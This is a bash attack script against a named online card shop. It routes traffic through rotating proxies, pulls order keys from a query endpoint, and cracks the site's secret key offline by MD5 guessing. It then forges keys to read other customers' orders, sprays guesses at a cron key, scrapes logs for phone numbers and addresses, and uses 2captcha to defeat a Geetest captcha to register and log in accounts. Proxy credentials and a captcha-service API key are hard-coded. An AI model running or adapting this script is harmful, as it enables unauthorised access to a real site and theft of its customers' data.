#!/bin/bash
# xxn7788 deep5 — query→skey→offline SYS_KEY, invite, token, cron, 2captcha, input spray
set -u
KEY=C413ED6D
PWD=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://xxn7788.top/shop
CK=/tmp/xxn_d5.ck
OUT=/tmp/xxn_d5_out
LOG=/tmp/xxn_d5.log
TWOCAP=685ea1068774ca8f8e9a292a08da66d6
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee -a "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --connect-timeout 5 --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
  if [[ -z "$SERVER" ]]; then
    RESP=$(curl -s --connect-timeout 5 --max-time 10 "https://share.proxy.qg.net/query?key=${KEY}" || true)
    SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
  fi
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PWD}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 5 --max-time 20 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" -H 'X-Requested-With: XMLHttpRequest' "$@"; }

for i in 1 2 3 4 5 6 7 8; do
  refresh
  code=$(curl -sk --connect-timeout 5 --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
  sleep 1
done
[[ "$code" == "200" ]] || { echo WARM_FAIL; exit 1; }

CSRF=$(python3 -c "import re;h=open('/tmp/xxn_d5_out/home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'var\s+csrf_token\s*=\s*\"([^\"]+)\"',h);print(m.group(1) if m else '')")
echo "CSRF_LEN=${#CSRF}"
echo "$CSRF" > "$OUT/csrf.txt"

TN=20260803101139692
INPUT=kami101138

echo "=== QUERY CORE (tradeno / input / id) ==="
r=$(c -X POST -d "qq=$TN&type=1&csrf_token=$CSRF" "$BASE/ajax.php?act=query")
echo "Q tn type1 => ${r:0:500}"
echo "$r" > "$OUT/q_tn.json"

r=$(c -X POST -d "qq=$INPUT&csrf_token=$CSRF" "$BASE/ajax.php?act=query")
echo "Q input => ${r:0:500}"
echo "$r" > "$OUT/q_input.json"

r=$(c -X POST -d "qq=2277&type=1&csrf_token=$CSRF" "$BASE/ajax.php?act=query")
echo "Q id2277 type1 => ${r:0:500}"
echo "$r" > "$OUT/q_id2277.json"

r=$(curl -sk --connect-timeout 5 --max-time 20 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" \
  -e "$BASE/?mod=query" -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -X POST --data-urlencode "qq=$TN" --data-urlencode "type=1" --data-urlencode "csrf_token=$CSRF" \
  "$BASE/ajax.php?act=query")
echo "Qform tn => ${r:0:500}"
echo "$r" > "$OUT/qform_tn.json"

r=$(curl -sk --connect-timeout 5 --max-time 20 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" \
  -e "$BASE/?mod=query" -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -X POST --data-urlencode "qq=$INPUT" --data-urlencode "csrf_token=$CSRF" \
  "$BASE/ajax.php?act=query")
echo "Qform input => ${r:0:500}"
echo "$r" > "$OUT/qform_input.json"

python3 - <<'PY'
import json,re,os
out='/tmp/xxn_d5_out'
hits=[]
for fn in ['q_tn.json','q_input.json','q_id2277.json','qform_tn.json','qform_input.json']:
  fp=f'{out}/{fn}'
  if not os.path.exists(fp): continue
  t=open(fp,encoding='utf-8',errors='ignore').read().strip()
  if not t.startswith('{'): 
    print(fn, 'nonjson', t[:80]); continue
  try: j=json.loads(t)
  except Exception as e:
    print(fn, 'parseerr', e); continue
  for row in (j.get('data') or []):
    if row.get('skey'):
      hits.append(row)
      print(f"SKEYHIT file={fn} id={row.get('id')} skey={row.get('skey')} status={row.get('status')} input={row.get('input')} tid={row.get('tid')}")
open(f'{out}/skeys.json','w').write(json.dumps(hits,ensure_ascii=False,indent=2))
print(f'total_skey_hits={len(hits)}')
PY

echo "=== OFFLINE SYS_KEY if skey known ==="
python3 - <<'PY'
import json,hashlib,os
out='/tmp/xxn_d5_out'
hits=json.load(open(f'{out}/skeys.json')) if os.path.exists(f'{out}/skeys.json') else []
if not hits:
  print('no skey for offline crack')
  open(f'{out}/syskey_offline.txt','w').write('none\n')
  raise SystemExit
row=hits[0]
oid=str(row['id']); skey=row['skey']
print(f'crack id={oid} skey={skey}')
cands=[]
for b in ['xxn7788','xxn778','xxn','xuxin66','xuxin','xiaoxiannv','7788','yiyi778','yiyi','caihong','faka','datou','qqfaka','SYSKEY','syskey','admin','password','123456','888888','666666']:
  for s in ['','123','888','666','2024','2025','2026','!','@','#','_key','_sys']:
    cands.append(b+s)
if os.path.exists('/tmp/xxn_syskeys.txt'):
  for line in open('/tmp/xxn_syskeys.txt',errors='ignore'):
    w=line.strip()
    if w and len(w)<=64: cands.append(w)
seen=set(); keys=[]
for k in cands:
  if k not in seen:
    seen.add(k); keys.append(k)
print(f'candidates={len(keys)}')
hit=None
for i,k in enumerate(keys,1):
  if hashlib.md5(f'{oid}{k}{oid}'.encode()).hexdigest()==skey:
    hit=k; print(f'SYSKEY_HIT={k}'); break
  if i%2000==0: print(f'offline prog {i}/{len(keys)}')
open(f'{out}/syskey_offline.txt','w').write(f'hit={hit}\nid={oid}\nskey={skey}\ntried={len(keys)}\n')
if hit:
  open(f'{out}/SYS_KEY.txt','w').write(hit+'\n')
PY

if [[ -f "$OUT/SYS_KEY.txt" ]]; then
  SK=$(cat "$OUT/SYS_KEY.txt")
  echo "=== ONLINE VERIFY SYS_KEY=$SK ==="
  c "$BASE/" -o "$OUT/home.html" >/dev/null
  CSRF=$(python3 -c "import re;h=open('/tmp/xxn_d5_out/home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'var\s+csrf_token\s*=\s*\"([^\"]+)\"',h);print(m.group(1) if m else '')")
  for oid in 2277 2276 2275 2270 2200 2000 1500 1000 500 100 1; do
    skey=$(python3 -c "import hashlib,sys; oid=sys.argv[1]; sk=sys.argv[2]; print(hashlib.md5(f'{oid}{sk}{oid}'.encode()).hexdigest())" "$oid" "$SK")
    r=$(c -X POST -d "id=$oid&skey=$skey&csrf_token=$CSRF" "$BASE/ajax.php?act=order")
    echo "ORDER $oid => ${r:0:350}"
    echo "$r" > "$OUT/order_$oid.json"
  done
fi

# If we have skey from query but no SYS_KEY, still call act=order
python3 - <<'PY'
import json,os,subprocess
out='/tmp/xxn_d5_out'
hits=json.load(open(f'{out}/skeys.json')) if os.path.exists(f'{out}/skeys.json') else []
open(f'{out}/has_skey.flag','w').write('1' if hits else '0')
if hits:
  open(f'{out}/first_id.txt','w').write(str(hits[0]['id']))
  open(f'{out}/first_skey.txt','w').write(hits[0]['skey'])
PY
if [[ -f "$OUT/first_skey.txt" ]]; then
  OID=$(cat "$OUT/first_id.txt")
  SKEY=$(cat "$OUT/first_skey.txt")
  echo "=== ORDER via query skey id=$OID ==="
  r=$(c -X POST -d "id=$OID&skey=$SKEY&csrf_token=$CSRF" "$BASE/ajax.php?act=order")
  echo "ORDER => ${r:0:500}"
  echo "$r" > "$OUT/order_via_skey.json"
  c "$BASE/?mod=faka&id=$OID&skey=$SKEY" -o "$OUT/faka.html" -w "faka=%{http_code}:%{size_download}\n"
fi

echo "=== API token / change ==="
for p in "%61pi.php?act=token&key=test" "%61pi.php?act=token&key=xxn7788" "%61pi.php?act=change&key=test" "%61pi.php?act=siteinfo" "%61pi.php?act=tools&key="; do
  r=$(c "$BASE/$p")
  echo "API $p => ${r:0:220}"
  echo "$r" > "$OUT/api_$(echo $p | tr '?&/=%' '_____').txt"
done

echo "=== invite / gift / card / cart ==="
for act in invite_content invite_query gift_start card_check cart_info cart_list checklogin getshareid share_link; do
  r=$(c -X POST -d "csrf_token=$CSRF&query_qq=123456&km=test123" "$BASE/ajax.php?act=$act")
  echo "ACT $act => ${r:0:240}"
  echo "$r" > "$OUT/act_$act.json"
done

echo "=== gettool sample tids ==="
for tid in 524 500 601 322 593; do
  r=$(c -X POST -d "tid=$tid&csrf_token=$CSRF" "$BASE/ajax.php?act=gettool")
  echo "TOOL $tid => ${r:0:280}"
  echo "$r" > "$OUT/tool_$tid.json"
done

echo "=== toollogs scrape ==="
c "$BASE/toollogs.php" -o "$OUT/toollogs.html" -w "toollogs=%{http_code}:%{size_download}\n"
python3 - <<'PY'
import re
h=open('/tmp/xxn_d5_out/toollogs.html',encoding='utf-8',errors='ignore').read()
for pat in [r'20\d{15}', r'1\d{9,10}', r'@[\w]+', r'T[A-Za-z0-9]{30,}']:
  ms=re.findall(pat,h)
  print(pat, 'count', len(ms), 'sample', ms[:8])
text=re.sub(r'<[^>]+>',' ',h)
text=re.sub(r'\s+',' ',text)
print('TEXT', text[:900])
open('/tmp/xxn_d5_out/toollogs_text.txt','w').write(text[:5000])
PY

echo "=== cron key spray ==="
python3 - <<'PY'
keys=[]
for b in ['xxn7788','xxn778','xxn','7788','yiyi778','yiyi','cron','cronkey','monitor','jiankong','admin','123456','888888','666666','password','caihong','faka','xuxin66','xuxin','datou','qq123','test','key','abc123','qwer1234','1qaz2wsx']:
  for s in ['','123','888','666','2024','2025','2026','!','@']:
    keys.append(b+s)
if __import__('os').path.exists('/tmp/xxn_syskeys.txt'):
  n=0
  for line in open('/tmp/xxn_syskeys.txt',errors='ignore'):
    w=line.strip()
    if w and len(w)<=32:
      keys.append(w); n+=1
      if n>=3500: break
seen=set(); out=[]
for k in keys:
  if k not in seen:
    seen.add(k); out.append(k)
open('/tmp/xxn_cronkeys.txt','w').write('\n'.join(out))
print('cronkeys', len(out))
PY
i=0; chits=0
while IFS= read -r k; do
  [[ -z "$k" ]] && continue
  i=$((i+1))
  (( i % 60 == 1 )) && refresh
  qk=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$k")
  r=$(c "$BASE/cron.php?key=$qk")
  if [[ -z "$r" ]]; then continue; fi
  if echo "$r" | grep -q '监控密钥不正确'; then
    :
  else
    echo "CRONHIT key=$k => ${r:0:220}"
    echo "$k|$r" >> "$OUT/cron_hits.txt"
    chits=$((chits+1))
  fi
  if (( i % 100 == 0 )); then echo "cron prog $i hits=$chits"; fi
  if (( i >= 2800 )); then break; fi
done < /tmp/xxn_cronkeys.txt
echo "CRON_DONE i=$i hits=$chits"

echo "=== login / captcha / 2captcha ==="
c "$BASE/user/login.php" -o "$OUT/login.html" -w "login=%{http_code}:%{size_download}\n"
c "$BASE/user/reg.php" -o "$OUT/reg.html" -w "reg=%{http_code}:%{size_download}\n"
r=$(c -X POST -d "csrf_token=$CSRF" "$BASE/ajax.php?act=captcha")
echo "CAPTCHA_INIT => ${r:0:350}"
echo "$r" > "$OUT/captcha.json"
r=$(c -X POST -d "user=testxxn7788&pass=Test123456&csrf_token=$CSRF" "$BASE/user/ajax.php?act=login")
echo "LOGIN_NOPROOF => ${r:0:300}"
echo "$r" > "$OUT/login_noproof.json"

python3 - <<'PY'
import json,re,os
out='/tmp/xxn_d5_out'
html=open(f'{out}/login.html',encoding='utf-8',errors='ignore').read()
gt=None
for pat in [r'captcha_id["\']?\s*[:=]\s*["\']([a-f0-9]+)', r'gt\s*[:=]\s*["\']([a-f0-9]+)', r'data-gt=["\']([a-f0-9]+)']:
  m=re.search(pat, html)
  if m: gt=m.group(1); break
try:
  cj=json.load(open(f'{out}/captcha.json'))
  print('captcha_json', cj)
  gt = gt or cj.get('gt') or cj.get('captcha_id')
except Exception as e:
  print('captcha json err', e); cj={}
print('GT', gt)
open(f'{out}/gt.txt','w').write(gt or '')
try:
  lj=json.load(open(f'{out}/login_noproof.json'))
except Exception:
  lj={}
print('login_resp', lj)
appid = lj.get('appid') or gt or ''
if lj.get('code')==2:
  open(f'{out}/need_geetest.txt','w').write(str(appid))
  print('NEED_CAPTCHA type', lj.get('type'), 'appid', appid)
PY

if [[ -f "$OUT/need_geetest.txt" && -s "$OUT/need_geetest.txt" ]]; then
  GT=$(cat "$OUT/need_geetest.txt")
  echo "Solving geetest GT=$GT"
  r=$(c -X POST -d "csrf_token=$CSRF" "$BASE/ajax.php?act=captcha")
  echo "captcha2 => ${r:0:350}"
  echo "$r" > "$OUT/captcha2.json"
  CHALLENGE=$(python3 -c "import json,sys
try:
 j=json.loads(sys.argv[1]); print(j.get('challenge') or '')
except Exception:
 print('')" "$r")
  echo "CHALLENGE=$CHALLENGE"
  CREATE=$(curl -s --max-time 30 "http://2captcha.com/in.php?key=${TWOCAP}&method=geetest&gt=${GT}&challenge=${CHALLENGE}&pageurl=${BASE}/user/login.php&json=1")
  echo "2CAP_CREATE=$CREATE"
  RID=$(python3 -c "import json,sys
try:
 j=json.loads(sys.argv[1]); print(j.get('request') if j.get('status')==1 else '')
except Exception:
 print('')" "$CREATE")
  echo "RID=$RID"
  if [[ -n "$RID" ]]; then
    for t in $(seq 1 24); do
      sleep 5
      RES=$(curl -s --max-time 20 "http://2captcha.com/res.php?key=${TWOCAP}&action=get&id=${RID}&json=1")
      echo "2CAP_RES[$t]=$RES"
      ST=$(python3 -c "import json,sys
try:
 j=json.loads(sys.argv[1]); print(j.get('status'))
except Exception:
 print(0)" "$RES")
      if [[ "$ST" == "1" ]]; then
        echo "$RES" > "$OUT/geetest_sol.json"
        break
      fi
      echo "$RES" | grep -q ERROR && break
    done
  fi
  if [[ -f "$OUT/geetest_sol.json" ]]; then
    python3 - <<'PY'
import json
sol=json.load(open('/tmp/xxn_d5_out/geetest_sol.json'))
req=sol.get('request')
data=req if isinstance(req,dict) else {}
challenge=data.get('geetest_challenge') or data.get('challenge','')
validate=data.get('geetest_validate') or data.get('validate','')
seccode=data.get('geetest_seccode') or data.get('seccode') or (validate+'|jordan' if validate else '')
open('/tmp/xxn_d5_out/gee_fields.txt','w').write(f'{challenge}\n{validate}\n{seccode}\n')
print('fields', challenge[:24], validate[:24], seccode[:40])
PY
    mapfile -t GF < "$OUT/gee_fields.txt"
    CH="${GF[0]}"; VA="${GF[1]}"; SE="${GF[2]}"
    USER="xxn$(date +%s | tail -c 7)"
    PASS='Xxn7788!a'
    c "$BASE/" -o "$OUT/home.html" >/dev/null
    CSRF=$(python3 -c "import re;h=open('/tmp/xxn_d5_out/home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'var\s+csrf_token\s*=\s*\"([^\"]+)\"',h);print(m.group(1) if m else '')")
    r=$(c -X POST --data-urlencode "user=$USER" --data-urlencode "pwd=$PASS" --data-urlencode "qq=123456789" \
      --data-urlencode "geetest_challenge=$CH" --data-urlencode "geetest_validate=$VA" --data-urlencode "geetest_seccode=$SE" \
      --data-urlencode "csrf_token=$CSRF" "$BASE/user/ajax.php?act=reguser")
    echo "REG $USER => ${r:0:300}"
    echo "$r" > "$OUT/reg.json"
    r=$(c -X POST --data-urlencode "user=$USER" --data-urlencode "pass=$PASS" \
      --data-urlencode "geetest_challenge=$CH" --data-urlencode "geetest_validate=$VA" --data-urlencode "geetest_seccode=$SE" \
      --data-urlencode "csrf_token=$CSRF" "$BASE/user/ajax.php?act=login")
    echo "LOGIN $USER => ${r:0:300}"
    echo "$r" > "$OUT/login.json"
    echo "$USER:$PASS" > "$OUT/creds.txt"
  fi
fi

echo "=== INPUT SPRAY ==="
i=0; ihits=0
for q in kami101138 123456 123456789 7788 xxn7788 xxn778 yiyi778 yiyi778yiyi admin test 111111 888888 666666 5201314 \
  10001 10086 13800138000 13900000000 qq123 000000 123123 112233 aa123456 password \
  1314520 123321 666888 168168 7777777 999999; do
  i=$((i+1))
  r=$(c -X POST -d "qq=$q&csrf_token=$CSRF" "$BASE/ajax.php?act=query")
  echo "IQ $q => ${r:0:250}"
  if echo "$r" | grep -q '"skey"'; then
    echo "INPUTHIT $q"
    echo "$r" > "$OUT/iq_$q.json"
    ihits=$((ihits+1))
  fi
done
echo "INPUT_SPRAY_DONE i=$i hits=$ihits"

echo "===== DEEP5 DONE ====="
ls -la "$OUT" | head -80
